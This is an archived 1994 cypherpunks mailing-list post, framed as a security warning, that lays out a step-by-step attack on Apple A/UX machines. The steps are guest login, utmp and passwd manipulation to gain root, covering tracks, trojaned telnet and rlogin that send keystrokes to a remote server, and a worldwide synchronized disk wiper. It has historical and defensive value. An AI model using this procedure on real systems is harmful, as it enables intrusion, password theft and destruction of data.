@@ -1,0 +1,251 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: How to Destroy the Internet (was Info about Linux) -->
+<!--X-From-R13: penjsbeqNfpehmarg.pbz ([vpunry R. Qenjsbeq) -->
+<!--X-Date: Thu, 8 Dec 94 16:25:01 PST -->
+<!--X-Message-Id: 199412090022.QAA09606@scruz.net -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>How to Destroy the Internet (was Info about Linux)</TITLE>
+<LINK REV="made" HREF="mailto:crawford@scruznet.com">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg00462.html">Date Prev</A>][<A HREF="msg00465.html">Date Next</A>][<A HREF="msg00480.html">Thread Prev</A>][<A HREF="msg00491.html">Thread Next</A>][<A HREF="index.html#00463">Date Index</A>][<A HREF="threads.html#00463">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>How to Destroy the Internet (was Info about Linux)</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: How to Destroy the Internet (was Info about Linux)</LI>
+<LI><em>From</em>: <A HREF="mailto:crawford@scruznet.com">crawford@scruznet.com</A> (Michael D. Crawford)</LI>
+<LI><em>Date</em>: Thu, 8 Dec 1994 16:22:22 -0800</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+-----BEGIN PGP SIGNED MESSAGE-----
+
+I write:
+
+&gt; You don't need to have a firewall to tighten up the security on your
+&gt; machine.  Read this book if you're going to put a Unix box of any sort on
+&gt; the Internet, or you might wake up some day to find someone's erased your
+&gt; hard disk from the other side of the globe.
+
+&gt; Matt Bartley &lt;mbartley@I guess this is wrong.edu&gt; writes
+
+&gt; Is it that dangerous?  I wonder how machines in college, which didn't
+&gt; have firewall protection that I know of, survived.  Then again, that
+&gt; was close to 3 years ago - maybe things are worse now.
+
+Before I proceed, let me point out that the following procedure has been
+documented for more than five years.  Some may regards it as irresponsible
+to publish this information, but I consider it a greater danger that many
+Unix machine owners fail to appreciate the seriousness of this problem.
+
+How to erase the hard disk of almost every Unix machine on the Internet:
+
+Apple's A/UX 2.0 was, at least initially, shipped with two well-known
+security holes, holes which had been documented for years in the CERT
+advisories.  When I was the MacTCP test engineer at Apple, I beta tested
+A/UX, found these holes, and tried very hard to get Apple to close them
+before shipping the product, which was primarily meant as Apple's candidate
+for an $80 million Air Force contract.  I found this pretty ironic, but
+when I griped about it at Apple - and I griped about it increasingly loudly
+as the ship date approached - all I got was sternly scolded.
+
+Apple's internal netadmins did invite to play "capture /flag" on their
+internal net Unix machines, which was fun.  I never could break into /flag.
+
+Security hole #1: A/UX ships with the guest login enabled, with no
+password.  Thus anyone can log in to any A/UX machine on the Internet.
+
+Security hole #2: A/UX was largely derived from SunOS, and shared a hole
+with older versions of SunOS.  The /etc/utmp file is world writable.  The
+reason this is done is so that shell windows in the MacOS process on A/UX,
+or under SunView on the Sun, can appear to be logged in terminals, I think
+mainly to allow "wall" to write messages to all the windows.
+
+This is a deadly error.  If /etc/utmp is world writable, anyone who can log
+in, with a little practice, can become root and cover evidence of their
+login in about 30 seconds.
+
+This is done as follows:
+
+0. Using HINFO records from the name service, and looking at the SMTP,
+   FTP, and login banners of many machines on the Internet, collect the
+   addresses of many A/UX machines.  For each A/UX machine do 1 - 15:
+
+1. On your local machine, running the window system of your choice, type
+    in a no-password passwd file entry for root into a window.  Leave the
+    window open.
+
+2. On your local machine, create a file in utmp format in which ../tmp/foo
+   is the only logged in terminal.  Copy it to the clipboard (this will be
+   a binary file - you have to write a small C program to create it).
+
+3. Log in as guest over the internet.
+
+4. cat /etc/utmp | od -h
+
+5  cp /etc/passwd /tmp/Ex12345
+
+6. cat &gt; /etc/utmp
+
+7. Paste the contents of your clipboard into the terminal window and press
+   control-D.  Now you've made /dev/../tmp/foo the only terminal which
+   appears to be logged in.
+
+8. ln -s /etc/passwd /tmp/foo
+
+9. rwall "root::0:0::/:/bin/sh".  This message is broadcast to all logged
+   in terminals, thus replacing the password file with your own.
+
+10. su ... now you are root.  Time to cover your tracks!
+
+11. mv /tmp/Ex12345 /etc/passwd
+
+12. Copy the hex dump that just scrolled by on your screen to the
+    clipboard.  Paste it into a program that you have written that
+    converts it back into binary, removes all the guest login records
+    from it, and places the result back on the clipboard.
+
+13. cat &gt; /etc/utmp ... paste into the terminal window and press ^D.
+
+14. Relax.  Take a break and look upon your handiwork.  The only
+    evidence of your connection is the existence of a couple of shell
+    processes and a telnet or rlogin daemon.  "who" or "users" will not
+    show you; the machine's users will have to examine ps listings very
+    carefully to see that you are logged in.
+
+15. When you've sufficiently regained your composure, use ftp to fetch
+    patched telnet and rlogin binaries from your machine.  With telnet
+    you could just set the debug flag to dribble all the user's keystrokes
+    into a file, but it would have more finesse to send a UDP packet of
+    the first few keystrokes of each session to a server you have somewhere
+    on the internet.
+
+16. Collect passwords to every machine that allows logins from the machine
+    you have just hacked.  If you get any root passwords, go to step 15.
+    (be sure to collect enough keystrokes to catch any su's that are done
+    after logging in as a regular use.  If the passwords are to any other
+    A/UX machines, or old SunOS machines, go to step 4.
+
+17. After you have collected lots of root passwords, right a C program
+    that will wait for a certain delay, then turn off all networking
+    using ifconfig (to prevent the admin from getting in and stopping
+    the damage), mmap the raw partitions of all the mounted hard disks,
+    make sure that the whole program is sitting in physical ram, then
+    write garbage into the mmap'ed memory blocks.  Install this program
+    on all your target machines, with the delay synchronized to each
+    system's own clock so that the damage happens simultaneously worldwide.
+
+You will probably want to distribute installation programs to a few dozen
+of your hacked machines, and have them all install on the machines nearby,
+to prevent word from getting out before the installations are all complete.
+
+If you're lucky, you can get the passwords to some backbone routers and
+partition the internet to help prevent the spread of the warning.
+
+The reason your college's machines have not been hacked yet, is because
+there are many machines on the internet, and the hackers have not got
+around to it yet.
+
+Read Firewalls and Internet Security, by William R. Cheswick and Steven M.
+Bellovin, ISBN 0-201-63357-4, before this happens to you.  Any machine that
+allows logins from your own machine will be compromised, if your machine is
+compromised.  Every machine that allows logins from any machine that allows
+logins from you will then be compromised, and so on.  If the security is
+not tightened up considerably on the hosts connected to the Internet,
+someone's going to do something like this and bring the whole thing down.
+The Morris Worm did a great deal of damage to the net, but did little in
+the way of monetary damage beyond wasted employee time.  Something like
+this would do damage in the billions of dollars.
+
+Regards,
+
+Michael D. Crawford
+crawford@scruznet.com     &lt;- Please note change of address.
+crawford@maxwell.ucsc.edu &lt;- Finger me here for PGP Public Key.
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6
+
+iQCVAwUBLucy8aJTibhK6XY5AQFyYgQAgHD4jMeXAt9iQ4h266nyP8jQcSYGUzCZ
+mbXCHiDEjmPLCqrFvLJv+5QiCVvCKVvjVLJzoJ5id7f8YiJFZFLqxVeLlUj9ZqxM
+jSrETQYUEv81dypYAZkTnFuZMU+VuGUBBFjjTIMUcRo+CCvgfyA6Tb3Fhfz2qGIW
+d4qjDuT7Jyc=
+=GcJ2
+-----END PGP SIGNATURE-----
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6
+
+mQCPAy7JYr8AAAEEAJ4GpoYcH5abkSq5FZQ9LxoP9oKKQDXHRGZT8QCcnVZ8o87H
+p9kEaUJIyzGbMHpO7C09qShwcrII2VfCZ77iWlBglmdLEa/dKXRCSWMFF52RcSDh
+zJF8m0wE2SZ9x4Y6KuXM3RwJVdEKLhsAImxckvfj0UBvb5xtJ6JTibhK6XY5ABEB
+AAG0LU1pY2hhZWwgRC4gQ3Jhd2ZvcmQgPGNyYXdmb3JkQHNjaXBwLnVjc2MuZWR1
+PokAlQMFEC7JZBeiU4m4Sul2OQEBpFID/jz5/tGopduwskgTHxvQDRe4D/rvUHov
+s+ILcFLmQyFC0iVHEWWBMtSnTcPZOVsTKqhonDAiMTvWTf5XaszvXZYaIOVBJGO2
+tTbX9AM3NtkLjyv6lQE7tssd7/XoQPy2CxI40f7sMh1AbDq43W/hpOI6TYfGAMcZ
+rdGMR7But9bb
+=kSZf
+-----END PGP PUBLIC KEY BLOCK-----
+
+Michael D. Crawford
+crawford@scruznet.com     &lt;- Please note change of address.
+crawford@maxwell.ucsc.edu &lt;- Finger me here for PGP Public Key.
+
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg00462.html">Re: cut &amp; choose</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg00465.html">Re: backing ecash</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00480.html">Re: cut &amp; choose</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00491.html">Re:  How to Destroy the Internet (was Info about Linux)</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#00463"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#00463"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
